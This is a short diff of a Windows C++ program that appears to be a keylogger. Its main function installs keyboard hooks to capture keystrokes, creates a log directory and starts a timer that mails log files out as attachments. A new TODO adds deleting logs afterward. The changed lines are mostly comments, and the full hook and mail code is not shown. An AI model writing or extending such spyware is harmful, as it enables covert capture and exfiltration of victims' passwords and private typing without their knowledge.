@@ -1,4 +1,5 @@
 #include <iostream>
+#include <filesystem>
 #include <windows.h>
 
 #include "Helper.h"
@@ -17,6 +18,7 @@ using namespace std;
 KeyboardManager keyboardManager;
 
 // TODO Move to helper.h
+// TODO delete logs after running them
 std::vector<std::string> GetAttatchments(const std::string& path)
 {
 	std::vector<std::string> ret;
@@ -53,9 +55,10 @@ void TimerSendMail()
 
 int main(int argc, char** argv)
 {
+	// Makes output directory for logs
 	IO::MKDir(IO::GetPath(true));
 
-	// Start Listening to keyboard
+	// Start Listening to keystrokes
 	keyboardManager.InstallHooks();
 
 	// Create and Start mail timer
